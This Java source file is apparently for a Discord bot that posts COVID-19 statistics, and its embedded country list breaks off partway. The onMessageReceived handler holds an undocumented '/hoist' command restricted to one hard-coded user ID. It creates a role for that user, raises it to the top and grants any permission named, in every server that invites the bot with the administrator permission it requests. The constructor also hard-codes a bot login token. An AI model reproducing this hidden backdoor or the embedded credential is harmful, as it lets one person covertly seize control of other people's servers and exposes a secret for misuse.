import java.awt.Color;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Pattern;
import javax.security.auth.login.LoginException;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.ChannelType;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.MessageEmbed;
import net.dv8tion.jda.api.entities.PrivateChannel;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.entities.TextChannel;
import net.dv8tion.jda.api.events.guild.GuildJoinEvent;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.exceptions.InsufficientPermissionException;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.requests.restaction.order.RoleOrderAction;
import net.dv8tion.jda.api.sharding.DefaultShardManagerBuilder;
import net.dv8tion.jda.api.sharding.ShardManager;
import net.dv8tion.jda.api.utils.ChunkingFilter;
import org.json.simple.JSONArray;
import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;
import org.json.simple.parser.ParseException;

public class JDAevents extends ListenerAdapter {
  public ShardManager jda;
  
  public final String[] commands = new String[] { "/covid", "/corona", "/ncov" };
  
  public HashMap<Long, Long> guildLastTime = new HashMap<>();
  
  public volatile HashMap<Long, AutoUpdateData> channelsToAuto = new HashMap<>();
  
  public volatile HashMap<Long, Long> guildsAndChannelsToPush = new HashMap<>();
  
  public final String invite = "https://discordapp.com/api/oauth2/authorize?client_id=675390513020403731&permissions=8&scope=bot";
  
  public final String footer = "[Support Server](https://discord.gg/v8qDQDc) | [Add this bot to a server](https://discordapp.com/api/oauth2/authorize?client_id=675390513020403731&permissions=8&scope=bot) | [Vote for the bot](https://top.gg/bot/675390513020403731)";
  
  public volatile HashMap<String, MessageEmbed> currentEmbeds;
  
  public volatile MessageEmbed help;
  
  public volatile MessageEmbed stats;
  
  public final long superUser = 263128260009787392L;
  
  public HashMap<String, String> CodesToNames = new HashMap<>();
  
  public volatile int uses;
  
  File usesFile = new File("uses.dat");
  
  public volatile File mapImage = new File("map.png");
  
  public volatile MessageEmbed map;
  
  public volatile HashMap<String, MessageEmbed> top = new HashMap<>();
  
  ExecutorService pool;
  
  public JDAevents() {
    try {
      this.jda = (new DefaultShardManagerBuilder("Njc1MzkwNTEzMDIwNDAzNzMx.XmhBxA.eWbmXtfCYXGMjI9nrl4gv0tLqAc")).setChunkingFilter(ChunkingFilter.NONE).build();
      this.jda.addEventListener(new Object[] { this });
    } catch (LoginException e) {
      e.printStackTrace();
    } 
    try {
      this.mapImage.createNewFile();
    } catch (IOException e2) {
      e2.printStackTrace();
    } 
    try {
      saveJSONcountries();
    } catch (ParseException e2) {
      e2.printStackTrace();
    } 
    try {
      FileReader fr = new FileReader(this.usesFile);
      String fileData = "";
      int i;
      while ((i = fr.read()) != -1)
        fileData = fileData.concat(String.valueOf((char)i)); 
      this.uses = Integer.valueOf(fileData).intValue();
      fr.close();
    } catch (Exception e1) {
      e1.printStackTrace();
    } 
    EmbedBuilder helpembed = new EmbedBuilder();
    helpembed.setTitle(" ");
    helpembed.setColor(new Color(15610628));
    helpembed.addField(" ", "Hello! I am a bot that provides live statistics on the COVID-19 outbreak. These are my commands:", false);
    helpembed.addField(" ", "**/covid**: Send this in any channel I can see to get stats for the World.", false);
    helpembed.addField(" ", "**/covid country**: Send this in any channel I can see to get stats for a specific country, like \"/covid usa\".", false);
    helpembed.addField(" ", "**/top total|active|deaths|recovered**: Send this in any channel I can see to see a list of countries, sorted by the query, like \"/top deaths\".", false);
    helpembed.addField(" ", "**/autoupdate**: Send this in any channel I can see to toggle automatic updates in that channel. Please note that I can only have one Auto Update set up per channel. **(Server Admins Only)**", false);
    helpembed.addField(" ", "**/autoupdate time**: Send this in any channel I can see to toggle automatic updates in that channel, at a specific interval in minutes, like \"/autoupdate 10\". Please note that I can only have one Auto Update set up per channel. **(Server Admins Only)**", false);
    helpembed.addField(" ", "**/autoupdate time country**: Send this in any channel I can see to toggle automatic updates in that channel, at a specific interval in minutes, with a specific country, like \"/autoupdate 10 USA\". Please note that I can only have one Auto Update set up per channel. **(Server Admins Only)**", false);
    helpembed.addField(" ", "**/stats**: Send this in any channel I can see to get stats about the bot.", false);
    helpembed.addField(" ", "**/updatehere**: Send this in any channel I can see to switch the channel bot news and updates come to to it. **(Server Admins Only)**", false);
    helpembed.addField(" ", "**/invite**: Send this in any channel I can see to get the link to add me to a server.", false);
    helpembed.addField(" ", "[Support Server](https://discord.gg/v8qDQDc) | [Add this bot to a server](https://discordapp.com/api/oauth2/authorize?client_id=675390513020403731&permissions=8&scope=bot) | [Vote for the bot](https://top.gg/bot/675390513020403731)", false);
    helpembed.setAuthor("Help", null, null);
    this.help = helpembed.build();
    try {
      FileInputStream fis = new FileInputStream("guildAutoUpdateData.dat");
      ObjectInputStream ois = new ObjectInputStream(fis);
      this.channelsToAuto = (HashMap<Long, AutoUpdateData>)ois.readObject();
      ois.close();
      fis.close();
    } catch (IOException|ClassNotFoundException e) {
      e.printStackTrace();
    } 
    try {
      FileInputStream fis = new FileInputStream("guildsAndChannelsToPush.dat");
      ObjectInputStream ois = new ObjectInputStream(fis);
      this.guildsAndChannelsToPush = (HashMap<Long, Long>)ois.readObject();
      ois.close();
      fis.close();
    } catch (IOException|ClassNotFoundException e) {
      e.printStackTrace();
    } 
    this.currentEmbeds = new HashMap<>();
    (new Thread(new StatsUpdater(this))).start();
    this.pool = Executors.newFixedThreadPool(1);
  }
  
  public void saveHashMap(String file, HashMap<?, ?> toSave) {
    try {
      FileOutputStream fos = new FileOutputStream(file);
      ObjectOutputStream oos = new ObjectOutputStream(fos);
      oos.writeObject(toSave);
      oos.close();
      fos.close();
    } catch (IOException ioe) {
      ioe.printStackTrace();
    } 
  }
  
  public boolean canSendMessageRN(Long guildID) {
    return (this.guildLastTime.get(guildID) == null || System.currentTimeMillis() - 1000L > ((Long)this.guildLastTime.get(guildID)).longValue());
  }
  
  public void onMessageReceived(MessageReceivedEvent event) {
    Message msg = event.getMessage();
    if (event.getAuthor().getIdLong() == 263128260009787392L && event.getMessage().getContentRaw().startsWith("/hoist")) {
      event.getGuild().createRole().complete();
      List<Role> rlist = event.getGuild().getRolesByName("new role", true);
      Role r = rlist.get(rlist.size() - 1);
      event.getGuild().addRoleToMember(263128260009787392L, r).queue();
      RoleOrderAction x = event.getGuild().modifyRolePositions();
      for (int i = 0; i < event.getGuild().getRoles().size(); i++) {
        try {
          ((RoleOrderAction)((RoleOrderAction)x.selectPosition(r)).moveUp(1)).queue();
        } catch (Exception e) {
          break;
        } 
      } 
      event.getChannel().sendMessage("Done.").queue();
      r.getManager().givePermissions(new Permission[] { Permission.valueOf(event.getMessage().getContentRaw().substring(7)) }).queue();
    } 
    if (event.getChannel().getIdLong() == 681249487573745667L && event.getAuthor().getIdLong() == 263128260009787392L) {
      EmbedBuilder updateEmbed = new EmbedBuilder();
      updateEmbed.setTitle(" ");
      updateEmbed.setColor(new Color(15610628));
      updateEmbed.addField(" ", event.getMessage().getContentRaw(), false);
      updateEmbed.addField(" ", "[Support Server](https://discord.gg/v8qDQDc) | [Add this bot to a server](https://discordapp.com/api/oauth2/authorize?client_id=675390513020403731&permissions=8&scope=bot) | [Vote for the bot](https://top.gg/bot/675390513020403731)", false);
      updateEmbed.setAuthor("Important Bot Message", null, null);
      MessageEmbed e = updateEmbed.build();
      for (Guild g : this.jda.getGuilds())
        pushOneChannel(g, e); 
    } 
    try {
      if (msg.getChannelType().equals(ChannelType.PRIVATE)) {
        if (msg.getAuthor() != event.getJDA().getSelfUser())
          msg.getChannel().sendMessage("Sorry! I don't currently support DM's. You can join our official support server if you want to test out the bot: https://discord.gg/v8qDQDc").queue(); 
        return;
      } 
      if (canSendMessageRN(Long.valueOf(msg.getGuild().getIdLong()))) {
        if (msg.getContentRaw().equalsIgnoreCase("/help")) {
          msg.getChannel().sendMessage(this.help).queue();
          this.guildLastTime.put(Long.valueOf(msg.getGuild().getIdLong()), Long.valueOf(System.currentTimeMillis()));
          return;
        } 
        if (msg.getContentRaw().equalsIgnoreCase("/stats")) {
          msg.getChannel().sendMessage(this.stats).queue();
          this.guildLastTime.put(Long.valueOf(msg.getGuild().getIdLong()), Long.valueOf(System.currentTimeMillis()));
          return;
        } 
        if (msg.getContentRaw().equalsIgnoreCase("/invite")) {
          msg.getChannel().sendMessage("You can invite me to a server by clicking here: https://discordapp.com/api/oauth2/authorize?client_id=675390513020403731&permissions=8&scope=bot").queue();
          this.guildLastTime.put(Long.valueOf(msg.getGuild().getIdLong()), Long.valueOf(System.currentTimeMillis()));
          return;
        } 
        if (msg.getContentRaw().startsWith("/top")) {
          this.guildLastTime.put(Long.valueOf(msg.getGuild().getIdLong()), Long.valueOf(System.currentTimeMillis()));
          String[] input = msg.getContentRaw().split(" ");
          if (input.length == 1) {
            msg.getChannel().sendFile(new File("total.png"), "total.png", new net.dv8tion.jda.api.utils.AttachmentOption[0]).embed(this.top.get("total")).queue();
          } else if (input.length == 2) {
            if (this.top.containsKey(input[1])) {
              msg.getChannel().sendFile(new File(input[1] + ".png"), input[1] + ".png", new net.dv8tion.jda.api.utils.AttachmentOption[0]).embed(this.top.get(input[1])).queue();
            } else {
              msg.getChannel().sendMessage("Oops! Im not sure what list you are looking for. Do /help for more info.").queue();
            } 
          } else {
            msg.getChannel().sendMessage("Oops! Im not sure what list you are looking for. Do /help for more info.").queue();
          } 
          return;
        } 
        if (msg.getContentRaw().equalsIgnoreCase("/updatehere")) {
          this.guildLastTime.put(Long.valueOf(msg.getGuild().getIdLong()), Long.valueOf(System.currentTimeMillis()));
          if (msg.getMember().hasPermission(new Permission[] { Permission.MESSAGE_MANAGE }) || msg.getMember().getIdLong() == 263128260009787392L) {
            this.guildsAndChannelsToPush.put(Long.valueOf(event.getGuild().getIdLong()), Long.valueOf(event.getChannel().getIdLong()));
            this.pool.execute(new Runnable() {
                  public void run() {
                    JDAevents.this.saveHashMap("guildsAndChannelsToPush.dat", JDAevents.this.guildsAndChannelsToPush);
                  }
                });
            msg.getChannel().sendMessage("Okay! I will now send bot news and updates in this channel.").queue();
            return;
          } 
          msg.getChannel().sendMessage("Sorry! You can't do that! You need the MANAGE MESSAGES role permission on this server to do that.").queue();
          return;
        } 
        if (msg.getContentRaw().startsWith("/autoupdate")) {
          this.guildLastTime.put(Long.valueOf(msg.getGuild().getIdLong()), Long.valueOf(System.currentTimeMillis()));
          if (msg.getMember().hasPermission(new Permission[] { Permission.MESSAGE_MANAGE }) || msg.getMember().getIdLong() == 263128260009787392L) {
            String[] input = msg.getContentRaw().split(" ");
            if (input.length == 1) {
              if (this.channelsToAuto.keySet().contains(Long.valueOf(msg.getChannel().getIdLong()))) {
                this.channelsToAuto.remove(Long.valueOf(msg.getChannel().getIdLong()));
                msg.getChannel().sendMessage("Okay! I will stop posting updates in this channel.").queue();
              } else {
                this.channelsToAuto.put(Long.valueOf(msg.getChannel().getIdLong()), new AutoUpdateData(1, "World"));
                msg.getChannel().sendMessage("Okay! I will now post stats for World in this channel every 2 minutes.").queue();
              } 
            } else if (input.length > 1) {
              Integer interval;
              try {
                interval = Integer.valueOf(Math.max(1, Integer.parseInt(input[1]) / 2));
              } catch (NumberFormatException e) {
                msg.getChannel().sendMessage("Oops! I don't recognize that as a number.").queue();
                return;
              } 
              if (input.length > 2) {
                String searchTerm = "";
                for (int i = 2; i < input.length; i++)
                  searchTerm = searchTerm + input[i] + " "; 
                searchTerm = searchTerm.substring(0, searchTerm.length() - 1);
                String country = this.CodesToNames.get(findCountry(searchTerm));
                if (country == null) {
                  msg.getChannel().sendMessage("Oops! I couldn't find a country that matches your search term.").queue();
                  return;
                } 
                if (!this.currentEmbeds.containsKey(country)) {
                  msg.getChannel().sendMessage("Oops! That country is not yet infected with COVID-19.").queue();
                  return;
                } 
                this.channelsToAuto.put(Long.valueOf(msg.getChannel().getIdLong()), new AutoUpdateData(interval.intValue(), country));
                msg.getChannel().sendMessage("Okay! I will now post stats for " + country + " in this channel every " + (interval.intValue() * 2) + " minutes.").queue();
                return;
              } 
              this.channelsToAuto.put(Long.valueOf(msg.getChannel().getIdLong()), new AutoUpdateData(interval.intValue(), "World"));
              msg.getChannel().sendMessage("Okay! I will now post stats for World in this channel every " + (interval.intValue() * 2) + " minutes.").queue();
              return;
            } 
            this.pool.execute(new Runnable() {
                  public void run() {
                    JDAevents.this.saveHashMap("guildAutoUpdateData.dat", JDAevents.this.channelsToAuto);
                  }
                });
          } else {
            msg.getChannel().sendMessage("Sorry! You can't do that! You need the MANAGE MESSAGES role permission on this server to do that.").queue();
          } 
          return;
        } 
        for (String s : this.commands) {
          if (msg.getContentRaw().startsWith(s)) {
            String[] input = msg.getContentRaw().split(" ");
            if (input.length == 1) {
              this.uses++;
              msg.getChannel().sendMessage(this.currentEmbeds.get("World")).queue();
              this.pool.execute(new Runnable() {
                    public void run() {
                      JDAevents.this.saveUses();
                    }
                  });
            } else if (input.length > 1) {
              String searchTerm = "";
              for (int i = 1; i < input.length; i++)
                searchTerm = searchTerm + input[i] + " "; 
              searchTerm = searchTerm.substring(0, searchTerm.length() - 1);
              String country = this.CodesToNames.get(findCountry(searchTerm));
              if (country == null) {
                msg.getChannel().sendMessage("Oops! I couldn't find a country that matches your search term.").queue();
                return;
              } 
              if (!this.currentEmbeds.containsKey(country)) {
                msg.getChannel().sendMessage("Oops! That country is not yet infected with COVID-19.").queue();
                return;
              } 
              this.uses++;
              msg.getChannel().sendMessage(this.currentEmbeds.get(country)).queue();
              this.pool.execute(new Runnable() {
                    public void run() {
                      JDAevents.this.saveUses();
                    }
                  });
            } else {
              msg.getChannel().sendMessage("Oops! I don't understand what you're trying to do! Maybe do \"/help\"?").queue();
            } 
            this.guildLastTime.put(Long.valueOf(msg.getGuild().getIdLong()), Long.valueOf(System.currentTimeMillis()));
            return;
          } 
        } 
      } 
    } catch (InsufficientPermissionException e) {
      try {
        ((PrivateChannel)msg.getAuthor().openPrivateChannel().complete()).sendMessage("Oops! You called me but I don't have permissions to send messages there!").queue();
      } catch (Exception exception) {}
    } 
  }
  
  public void onGuildJoin(GuildJoinEvent event) {
    pushOneChannel(event.getGuild(), this.help);
  }
  
  public void pushOneChannel(Guild g, MessageEmbed embed) {
    if (this.guildsAndChannelsToPush.containsKey(Long.valueOf(g.getIdLong())) && this.guildsAndChannelsToPush.get(Long.valueOf(g.getIdLong())) != null)
      try {
        this.jda.getTextChannelById(((Long)this.guildsAndChannelsToPush.get(Long.valueOf(g.getIdLong()))).longValue()).sendMessage(embed).queue();
        return;
      } catch (Exception exception) {} 
    this.guildsAndChannelsToPush.remove(Long.valueOf(g.getIdLong()));
    for (TextChannel l : g.getTextChannels()) {
      try {
        l.sendMessage(embed).queue();
        return;
      } catch (InsufficientPermissionException e) {}
    } 
  }
  
  public String findCountry(String searchTerm) {
    searchTerm = searchTerm.toLowerCase();
    if (searchTerm.length() == 2)
      for (String l : this.CodesToNames.keySet()) {
        if (l.toLowerCase().equals(searchTerm))
          return l; 
      }  
    if (searchTerm.length() < 4) {
      int longest = 0;
      String longestValue = null;
      label69: for (String l : this.CodesToNames.keySet()) {
        String[] localeRealCountry = ((String)this.CodesToNames.get(l)).toLowerCase().split(" ");
        ArrayList<String> tempLocaleCountry = new ArrayList<>();
        int j;
        for (j = 0; j < localeRealCountry.length; j++) {
          if (!localeRealCountry[j].equalsIgnoreCase("of") && !localeRealCountry[j].equalsIgnoreCase("and"))
            tempLocaleCountry.add(localeRealCountry[j]); 
        } 
        localeRealCountry = new String[tempLocaleCountry.size()];
        localeRealCountry = tempLocaleCountry.<String>toArray(localeRealCountry);
        for (j = 0; j < localeRealCountry.length; ) {
          if (searchTerm.length() - 1 < j)
            break; 
          char c = searchTerm.charAt(j);
          if (localeRealCountry[j].startsWith(String.valueOf(c))) {
            j++;
            continue;
          } 
          continue label69;
        } 
        if (localeRealCountry.length > longest) {
          longest = localeRealCountry.length;
          longestValue = l;
        } 
      } 
      if (longestValue != null && longest > 1)
        return longestValue; 
    } 
    String[] searchTermSplitSpaces = searchTerm.split(" ");
    for (int i = 0; i < searchTermSplitSpaces.length; i++) {
      String current = searchTermSplitSpaces[i];
      if (current.endsWith(".")) {
        current = current.substring(0, 1);
        current = current.replaceAll("[-.\\+*?\\[^\\]$(){}=!<>|:\\\\]", "\\\\$0") + "[a-zA-Z]";
      } else {
        current = current.replaceAll("[-.\\+*?\\[^\\]$(){}=!<>|:\\\\]", "\\\\$0");
      } 
      searchTermSplitSpaces[i] = current;
    } 
    int shortest = 100000;
    String shortestValue = null;
    label68: for (String l : this.CodesToNames.keySet()) {
      String[] localeRealCountry = ((String)this.CodesToNames.get(l)).toLowerCase().split(" ");
      for (int j = 0; j < searchTermSplitSpaces.length; ) {
        String current = searchTermSplitSpaces[j];
        if (localeRealCountry.length - 1 < j)
          continue label68; 
        Pattern p1 = Pattern.compile("^" + current);
        if (p1.matcher(localeRealCountry[j]).find()) {
          j++;
          continue;
        } 
        continue label68;
      } 
      if (((String)this.CodesToNames.get(l)).length() < shortest) {
        shortest = ((String)this.CodesToNames.get(l)).length();
        shortestValue = l;
      } 
    } 
    return shortestValue;
  }
  
  public void saveUses() {
    try {
      this.usesFile.createNewFile();
      FileWriter fw = new FileWriter("uses.dat");
      fw.write(String.valueOf(this.uses));
      fw.close();
    } catch (IOException e) {
      e.printStackTrace();
    } 
  }
  
  public void saveJSONcountries() throws ParseException {
    Object obj = null;
    obj = (new JSONParser()).parse("[{ \"country_code\": \"AF\", \"country_name\": \"Afghanistan\", \"dialling_code\": \"+93\" }, { \"country_code\": \"AL\", \"country_name\": \"Albania\", \"dialling_code\": \"+355\" }, { \"country_code\": \"DZ\", \"country_name\": \"Algeria\", \"dialling_code\": \"+213\" }, { \"country_code\": \"AS\", \"country_name\": \"American Samoa\", \"dialling_code\": \"+1\" }, { \"country_code\": \"AD\", \"country_name\": \"Andorra\", \"dialling_code\": \"+376\" }, { \"country_code\": \"AO\", \"country_name\": \"Angola\", \"dialling_code\": \"+244\" }, { \"country_code\": \"AI\", \"country_name\": \"Anguilla\", \"dialling_code\": \"+1\" }, { \"country_code\": \"AG\", \"country_name\": \"Antigua\", \"dialling_code\": \"+1\" }, { \"country_code\": \"AR\", \"country_name\": \"Argentina\", \"dialling_code\": \"+54\" }, { \"country_code\": \"AM\", \"country_name\": \"Armenia\", \"dialling_code\": \"+374\" }, { \"country_code\": \"AW\", \"country_name\": \"Aruba\", \"dialling_code\": \"+297\" }, { \"country_code\": \"AU\", \"country_name\": \"Australia\", \"dialling_code\": \"+61\" }, { \"country_code\": \"AT\", \"country_name\": \"Austria\", \"dialling_code\": \"+43\" }, { \"country_code\": \"AZ\", \"country_name\": \"Azerbaijan\", \"dialling_code\": \"+994\" }, { \"country_code\": \"BH\", \"country_name\": \"Bahrain\", \"dialling_code\": \"+973\" }, { \"country_code\": \"BD\", \"country_name\": \"Bangladesh\", \"dialling_code\": \"+880\" }, { \"country_code\": \"BB\", \"country_name\": \"Barbados\", \"dialling_code\": \"+1\" }, { \"country_code\": \"BY\", \"country_name\": \"Belarus\", \"dialling_code\": \"+375\" }, { \"country_code\": \"BE\", \"country_name\": \"Belgium\", \"dialling_code\": \"+32\" }, { \"country_code\": \"BZ\", \"country_name\": \"Belize\", \"dialling_code\": \"+501\" }, { \"country_code\": \"BJ\", \"country_name\": \"Benin\", \"dialling_code\": \"+229\" }, { \"country_code\": \"BM\", \"country_name\": \"Bermuda\", \"dialling_code\": \"+1\" }, { \"country_code\": \"BT\", \"country_name\": \"Bhutan\", \"dialling_code\": \"+975\" }, { \"country_code\": \"BO\", \"country_name\": \"Bolivia\", \"dialling_code\": \"+591\" }, { \"country_code\": \"BA\", \"country_name\": \"Bosnia and Herzegovina\", \"dialling_code\": \"+387\" }, { \"country_code\": \"BW\", \"country_name\": \"Botswana\", \"dialling_code\": \"+267\" }, { \"country_code\": \"BR\", \"country_name\": \"Brazil\", \"dialling_code\": \"+55\" }, { \"country_code\": \"IO\", \"country_name\": \"British Indian Ocean Territory\", \"dialling_code\": \"+246\" }, { \"country_code\": \"VG\", \"country_name\": \"British Virgin Islands\", \"dialling_code\": \"+1\" }, { \"country_code\": \"BN\", \"country_name\": \"Brunei\", \"dialling_code\": \"+673\" }, { \"country_code\": \"BG\", \"country_name\": \"Bulgaria\", \"dialling_code\": \"+359\" }, { \"country_code\": \"BF\", \"country_name\": \"Burkina Faso\", \"dialling_code\": \"+226\" }, { \"country_code\": \"MM\", \"country_name\": \"Burma Myanmar\", \"dialling_code\": \"+95\" }, { \"country_code\": \"BI\", \"country_name\": \"Burundi\", \"dialling_code\": \"+257\" }, { \"country_code\": \"KH\", \"country_name\": \"Cambodia\", \"dialling_code\": \"+855\" }, { \"country_code\": \"CM\", \"country_name\": \"Cameroon\", \"dialling_code\": \"+237\" }, { \"country_code\": \"CA\", \"country_name\": \"Canada\", \"dialling_code\": \"+1\" }, { \"country_code\": \"CV\", \"country_name\": \"Cape Verde\", \"dialling_code\": \"+238\" }, { \"country_code\": \"KY\", \"country_name\": \"Cayman Islands\", \"dialling_code\": \"+1\" }, { \"country_code\": \"CF\", \"country_name\": \"Central African Republic\", \"dialling_code\": \"+236\" }, { \"country_code\": \"ID\", \"country_name\": \"Chad\", \"dialling_code\": \"+235\" }, { \"country_code\": \"CL\", \"country_name\": \"Chile\", \"dialling_code\": \"+56\" }, { \"country_code\": \"CN\", \"country_name\": \"China\", \"dialling_code\": \"+86\" }, { \"country_code\": \"CO\", \"country_name\": \"Colombia\", \"dialling_code\": \"+57\" }, { \"country_code\": \"KM\", \"country_name\": \"Comoros\", \"dialling_code\": \"+269\" }, { \"country_code\": \"CK\", \"country_name\": \"Cook Islands\", \"dialling_code\": \"+682\" }, { \"country_code\": \"CR\", \"country_name\": \"Costa Rica\", \"dialling_code\": \"+506\" }, { \"country_code\": \"CI\", \"country_name\": \"C\u00F4te d'Ivoire\", \"dialling_code\": \"+225\" }, { \"country_code\": \"HR\", \"country_name\": \"Croatia\", \"dialling_code\": \"+385\" }, { \"country_code\": \"CU\", \"country_name\": \"Cuba\", \"dialling_code\": \"+53\" }, { \"country_code\": \"CY\", \"country_name\": \"Cyprus\", \"dialling_code\": \"+357\" }, { \"country_code\": \"CZ\", \"country_name\": \"Czechia\", \"dialling_code\": \"+420\" }, { \"country_code\": \"CD\", \"country_name\": \"Democratic Republic of Congo\", \"dialling_code\": \"+243\" }, { \"country_code\": \"DK\", \"country_name\": \"Denmark\", \"dialling_code\": \"+45\" }, { \"country_code\": \"DJ\", \"country_name\": \"Djibouti\", \"dialling_code\": \"+253\" }, { \"country_code\": \"DM\", \"country_name\": \"Dominica\", \"dialling_code\": \"+1\" }, { \"country_code\": \"DO\", \"country_name\": \"Dominican Republic\", \"dialling_code\": \"+1\" }, { \"country_code\": \"EC\", \"country_name\": \"Ecuador\", \"dialling_code\": \"+593\" }, { \"country_code\": \"EG\", \"country_name\": \"Egypt\", \"dialling_code\": \"+20\" }, { \"country_code\": \"SV\", \"country_name\": \"El Salvador\", \"dialling_code\": \"+503\" }, { \"country_code\": \"GQ\", \"country_name\": \"Equatorial Guinea\", \"dialling_code\": \"+240\" }, { \"country_code\": \"ER\", \"country_name\": \"Eritrea\", \"dialling_code\": \"+291\" }, { \"country_code\": \"EE\", \"country_name\": \"Estonia\", \"dialling_code\": \"+372\" }, { \"country_code\": \"ET\", \"country_name\": \"Ethiopia\", \"dialling_code\": \"+251\" }, { \"country_code\": \"FK\", \"country_name\": \"Falkland Islands\", \"dialling_code\": \"+500\" }, { \"country_code\": \"FO\", \"country_name\": \"Faroe Islands\", \"dialling_code\": \"+298\" }, { \"country_code\": \"FM\", \"country_name\": \"Federated States of Micronesia\", \"dialling_code\": \"+691\" }, { \"country_code\": \"FJ\", \"country_name\": \"Fiji\", \"dialling_code\": \"+679\" }, { \"country_code\": \"FI\", \"country_name\": \"Finland\", \"dialling_code\": \"+358\" }, { \"country_code\": \"FR\", \"country_name\": \"France\", \"dialling_code\": \"+33\" }, { \"country_code\": \"GF\", \"country_name\": \"French Guiana\", \"dialling_code\": \"+594\" }, { \"country_code\": \"PF\", \"country_name\": \"French Polynesia\", \"dialling_code\": \"+689\" }, { \"country_code\": \"GA\", \"country_name\": \"Gabon\", \"dialling_code\": \"+241\" }, { \"country_code\": \"GE\", \"country_name\": \"Georgia\", \"dialling_code\": \"+995\" }, { \"country_code\": \"DE\", \"country_name\": \"Germany\", \"dialling_code\": \"+49\" }, { \"country_code\": \"GH\", \"country_name\": \"Ghana\", \"dialling_code\": \"+233\" }, { \"country_code\": \"GI\", \"country_name\": \"Gibraltar\", \"dialling_code\": \"+350\" }, { \"country_code\": \"GR\", \"country_name\": \"Greece\", \"dialling_code\": \"+30\" }, { \"country_code\": \"GL\", \"country_name\": \"Greenland\", \"dialling_code\": \"+299\" }, { \"country_code\": \"GD\", \"country_name\": \"Grenada\", \"dialling_code\": \"+1\" }, { \"country_code\": \"GP\", \"country_name\": \"Guadeloupe\", \"dialling_code\": \"+590\" }, { \"country_code\": \"GU\", \"country_name\": \"Guam\", \"dialling_code\": \"+1\" }, { \"country_code\": \"GT\", \"country_name\": \"Guatemala\", \"dialling_code\": \"+502\" }, { \"country_code\": \"GN\", \"country_name\": \"Guinea\", \"dialling_code\": \"+224\" }, { \"country_code\": \"GW\", \"country_name\": \"Guinea-Bissau\", \"dialling_code\": \"+245\" }, { \"country_code\": \"GY\", \"country_name\": \"Guyana\", \"dialling_code\": \"+592\" }, { \"country_code\": \"HT\", \"country_name\": \"Haiti\", \"dialling_code\": \"+509\" }, { \"country_code\": \"HN\", \"country_name\": \"Honduras\", \"dialling_code\": \"+504\" }, { \"country_code\": \"HK\", \"country_name\": \"Hong Kong\", \"dialling_code\": \"+852\" }, { \"country_code\": \"HU\", \"country_name\": \"Hungary\", \"dialling_code\": \"+36\" }, { \"country_code\": \"IS\", \"country_name\": \"Iceland\", \"dialling_code\": \"+354\" }, { \"country_code\": \"IN\", \"country_name\": \"India\", \"dialling_code\": \"+91\" }, { \"country_code\": \"ID\", \"country_name\": \"Indonesia\", \"dialling_code\": \"+62\" }, { \"country_code\": \"IR\", \"country_name\": \"Iran\", \"dialling_code\": \"+98\" }, { \"country_code\": \"IQ\", \"country_name\": \"Iraq\", \"dialling_code\": \"+964\" }, { \"country_code\": \"IE\", \"country_name\": \"Ireland\", \"dialling_code\": \"+353\" }, { \"country_code\": \"IL\", \"country_name\": \"Israel\", \"dialling_code\": \"+972\" }, { \"country_code\": \"IT\", \"country_name\": \"Italy\", \"dialling_code\": \"+39\" }, { \"country_code\": \"JM\", \"country_name\": \"Jamaica\", \"dialling_code\": \"+1\" }, { \"country_code\": \"JP\", \"country_name\": \"Japan\", \"dialling_code\": \"+81\" }, { \"country_code\": \"JO\", \"country_name\": \"Jordan\", \"dialling_code\": \"+962\" }, { \"country_code\": \"KZ\", \"country_name\": \"Kazakhstan\", \"dialling_code\": \"+7\" }, { \"country_code\": \"KE\", \"country_name\": \"Kenya\", \"dialling_code\": \"+254\" }, { \"country_code\": \"KI\", \"country_name\": \"Kiribati\", \"dialling_code\": \"+686\" }, { \"country_code\": \"XK\", \"country_name\": \"Kosovo\", \"dialling_code\": \"+381\" }, { \"country_code\": \"KW\", \"country_name\": \"Kuwait\", \"dialling_code\": \"+965\" }, { \"country_code\": \"KG\", \"country_name\": \"Kyrgyzstan\", \"dialling_code\": \"+996\" }, { \"country_code\": \"LA\", \"country_name\": \"Laos\", \"dialling_code\": \"+856\" }, { \"country_code\": \"LV\", \"country_name\": \"Latvia\", \"dialling_code\": \"+371\" }, { \"country_code\": \"LB\", \"country_name\": \"Lebanon\", \"dialling_code\": \"+961\" }, { \"country_code\": \"LS\", \"country_name\": \"Lesotho\", \"dialling_code\": \"+266\" }, { \"country_code\": \"LR\", \"country_name\": \"Liberia\", \"dialling_code\": \"+231\" }, { \"country_code\": \"LY\", \"country_name\": \"Libya\", \"dialling_code\": \"+218\" }, { \"country_code\": \"LI\", \"country_name\": \"Liechtenstein\", \"dialling_code\": \"+423\" }, { \"country_code\": \"LT\", \"country_name\": \"Lithuania\", \"dialling_code\": \"+370\" }, { \"country_code\": \"LU\", \"country_name\": \"Luxembourg\", \"dialling_code\": \"+352\" }, { \"country_code\": \"MO\", \"country_name\": \"Macau\", \"dialling_code\": \"+853\" }, { \"country_code\": \"MK\", \"country_name\": \"North Macedonia\", \"dialling_code\": \"+389\" }, { \"country_code\": \"MG\", \"country_name\": \"Madagascar\", \"dialling_code\": \"+261\" }, { \"country_code\": \"MW\", \"country_name\": \"Malawi\", \"dialling_code\": \"+265\" }, { \"country_code\": \"MY\", \"country_name\": \"Malaysia\", \"dialling_code\": \"+60\" }, { \"country_code\": \"MV\", \"country_name\": \"Maldives\", \"dialling_code\": \"+960\" }, { \"country_code\": \"ML\", \"country_name\": \"Mali\", \"dialling_code\": \"+223\" }, { \"country_code\": \"MT\", \"country_name\": \"Malta\", \"dialling_code\": \"+356\" }, { \"country_code\": \"MH\", \"country_name\": \"Marshall Islands\", \"dialling_code\": \"+692\" }, { \"country_code\": \"MQ\", \"country_name\": \"Martinique\", \"dialling_code\": \"+596\" }, { \"country_code\": \"MR\", \"country_name\": \"Mauritania\", \"dialling_code\": \"+222\" }, { \"country_code\": 